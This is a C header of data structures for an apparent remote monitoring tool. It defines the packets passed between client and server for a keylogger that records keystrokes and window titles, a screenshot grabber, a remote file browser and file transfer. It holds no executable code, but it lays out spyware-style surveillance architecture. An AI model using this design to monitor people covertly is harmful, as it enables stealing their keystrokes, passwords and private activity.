
// ** Remote Monitoring **

// DataStructures.h
// Consists of all the data structures exchanged between the Server and Client

// ** Common **
// Data structure to store local file paths
typedef struct tagLocalFilePaths
{
	WCHAR wszName[MAX_PATH_NAME + 1];
	WCHAR wszPath[MAX_PATH + 1];
}LOCALFILEPATHS;

// Data structure to store the list of files in a directory
// returned by the library function ListDir()
typedef struct tagFileList
{
	WCHAR	wszFileName[MAX_PATH + 1];
}FILELIST;

// Data structure used during File Transfer Operation
typedef struct tagFTPacket
{
	PACKET_TYPE iPacketType;	// file data, file marker, checksum data
	RM_COMMAND	cmd;
	int			iDataSize;
	char		szData[FT_BUFSIZE + 1];
}FTPACKET;

// Data structure to store checksum
typedef struct tagChecksum
{
	unsigned Message_Digest[5];
}CHECKSUM;

// 
typedef struct tagFileTransferData
{
	int			nFiles;
	FILELIST	ListOfFiles[MAX_FILES];
}FILE_TRANSFER_DATA;


// ** Server Side **
// Data structures sent by the Server to the Client

// * KeyLoggerMonitor *
// Data structure to store KL configuration
typedef struct tagKLConfig
{
	int		nApps;
	unsigned long ulRTInterval;
	unsigned long ulOffInterval;
	WCHAR	AppList[MAX_APPS][MAX_FILE_NAME + 1];
}KLCONFIG;

// KLM Data structure
typedef struct tagKLMData
{
	RM_COMMAND  cmd;
	SYSTEMTIME  stFromDate;
	SYSTEMTIME  stToDate;
	KLCONFIG	KLConfig;
}KLMDATA;

// * ScreenGrabberMonitor *
// Data structure to store applications to be monitored by SG
typedef struct tagSGAppList
{
	int		iShotType;
	WCHAR	wszEXEName[MAX_PATH + 1];
}SGAPPLIST;

// Data structures to store SG configuration
typedef struct tagSGConfig
{
	int	nApps;
	unsigned long	ulRTInterval;
	unsigned long	ulOffInterval;
	SGAPPLIST		SGAppList[MAX_APPS];
}SGCONFIG;

// Data structure to store information 
// associated with retrieve snaps command.
typedef struct tagSGMRetSnaps
{
	SYSTEMTIME	stFromDate;
	SYSTEMTIME	stToDate;
	WCHAR		wszAppName[MAX_FILE_NAME + 1];
}SGMRETSNAPS;

// Data structure to store RealTime 
// monitored application information.
typedef struct tagSGRealApp
{
	WCHAR	wszEXEName[MAX_PATH + 1];
}SGREALAPP;

// union of all the structures used by SGM
typedef union tagSGMStructs
{
	SGMRETSNAPS	SGMRetSnaps;
	SGCONFIG	SGConfig;
	SGREALAPP	SGRealApp;
}SGMSTRUCTURES;

// SGM Data structure
typedef struct tagSGMData
{
	RM_COMMAND		cmd;
	SGMSTRUCTURES	SGMStructs;	
}SGMDATA;

// * File Browser Monitor *
// Data structure to store command and the path to expand
// from server to client.
typedef struct tagFBMData
{
	RM_COMMAND cmd;
	WCHAR wszPath[MAX_PATH + 1];	// absolute path of directory to be expanded in the tree view
}FBMDATA;

// SPM Data structures
typedef union tagMNTRData
{
	KLMDATA KLMData;
	SGMDATA SGMData;
	FBMDATA	FBMData;
}MNTRDATA;

typedef struct tagSPMData
{
	RM_COMMAND	cmd;		// meant to be read by the CPM
	PTYPE		PluginID;
	MNTRDATA	MNTRData;
}SPMDATA;

// SCM Data structure
typedef struct tagSCMDataType
{
	RM_COMMAND			cmd;
	SPMDATA				SPMDataOut;
	FILE_TRANSFER_DATA	FileTransferData;
}SCMDATATYPE;

typedef struct tagSCMData
{
	PACKET_TYPE	iPacketType;	// COMMAND / NOTIFICATION / PM_DATA (plugin manager data)
	SCMDATATYPE	SCMDataType;
}SCMDATA;


// ** Client Side **
// Data structures sent by the Client to the Server

// * KeyLogger *
// KL Window data structure
typedef struct KLWndData
{
	HWND	hWnd;
	WCHAR	wszClassName[MAX_CLASS_NAME + 1];
	WCHAR	wszWndTitle[MAX_WND_TITLE + 1];

}KLWNDDATA;

// Process information data structure
typedef struct tagKLProcessData
{
	WCHAR		wszEXEName[MAX_FILE_NAME + 1];
	SYSTEMTIME	stStartTime;
}KLPROCESSDATA;

// To store temporary data (keys and window hierarchy) @ KL Hook DLL
typedef struct tagKLTempData
{
	int						KeyCount;
	int						KeysBufferLength;
	int						WndCount;

	WCHAR					Keys[MAX_KL_KEYS + 1];

	KLWNDDATA				KLWndData[MAX_WND_LIST];
	KLPROCESSDATA			ProcessData;

	struct tagKLTempData	*pNextLink;

}KLTEMPDATA;

// To store temporary data (keys and window hierarchy)
typedef struct tagKLIFLinkList
{
	int						KeyCount;
	int						KeysBufferLength;
	int						WndCount;

	WCHAR					Keys[MAX_KLIF_KEYS + 1];

	KLWNDDATA				KLWndData[MAX_WND_LIST];
	KLPROCESSDATA			ProcessData;

	struct tagKLIFLinkList	*pNextLink;
	struct tagKLIFLinkList	*pSiblingLink;

}KLIFLINKLIST;


typedef struct tagKLRTTree
{
	int				iKeyCount;
	WCHAR			wszKeys[MAX_KLIF_KEYS + 1];
	int				iWndCount;
	KLWNDDATA		KLWndData[MAX_WND_LIST];
	KLPROCESSDATA	ProcessData;
}KLRTTREE;

// To store data to be written into the log file
typedef struct tagLogFileData
{
	int				KeyCount;
	int				KeysBufferLength;
	int				WndCount;

	WCHAR			Keys[MAX_KLIF_KEYS + 1];

	KLWNDDATA		KLWndData[MAX_WND_LIST];
	KLPROCESSDATA	ProcessData;

}LOGFILEDATA;

// * File Browser *
// Data structures to store absolute paths
// requested by the FBM.
typedef struct tagFBFileList
{
	DWORD dwFileSize;
	DWORD dwFileAttributes;
	SYSTEMTIME stLastAccess;
	WCHAR wszFileName[MAX_PATH + 1];
}FBFILELIST;

typedef struct tagFBData
{
	int nPaths;
	FBFILELIST FBFileList[MAX_FILES];
}FBDATA;


// * ClientPluginManager *
// Data structure to store plugin information
typedef struct tagPluginInfo
{
	PTYPE	iPluginID;
	WCHAR	wszPath[MAX_PATH + 1];
	WCHAR	wszName[MAX_FILE_NAME + 1];
	WCHAR	wszDLLInterfaceName[MAX_FILE_NAME + 1];
}PLUGININFO;

// Data structure to store client configuration
typedef struct tagClientConf
{
	int				nPlugins;
	WCHAR			wszIP[IPADDR_LEN + 1];
	PLUGININFO		PluginInfo[MAX_PLUGINS];
}CLIENTCONF;

// Data structure to store information about 
// image file sent to the server.
typedef struct tagSGFileData
{
	int			nFiles;
	SYSTEMTIME	stProcessLaunchTime;
	WCHAR		wszEXEName[MAX_FILE_NAME + 1];
	FILELIST	ListOfFiles[MAX_FILES];
}SGFILEDATA;

// Union of data structures of all plugins
typedef union tagPDataType
{
	LOGFILEDATA			KLRTData;
	FILE_TRANSFER_DATA	KLFileTransfer;
	SGFILEDATA			SGFileData;
	FBDATA				FBData;
	CLIENTCONF			ClientConf;
}PDATATYPE;

typedef struct tagPData
{
	CLI_RESPONSE		iMessage;
	PTYPE				PluginID;
	PDATATYPE			PDataType;
}PDATA;

// Data structure to store arguments to ClientPluginManager()
typedef struct tagCPMArgs
{
	RM_COMMAND		cmd;
	PDATA			PData;
}CPMARGS;

typedef struct tagCPMData
{
	RM_COMMAND		cmd;		// command meant for the SPM
	PDATA			PData;
}CPMDATA;

// * ClientComModule *
typedef union tagCCMDataType
{
	CLI_RESPONSE		cmd;
	CPMDATA				CPMDataOut;
}CCMDATATYPE;

typedef struct tagCCMData
{
	PACKET_TYPE		iPacketType;
	CCMDATATYPE		CCMDataType;
}CCMDATA;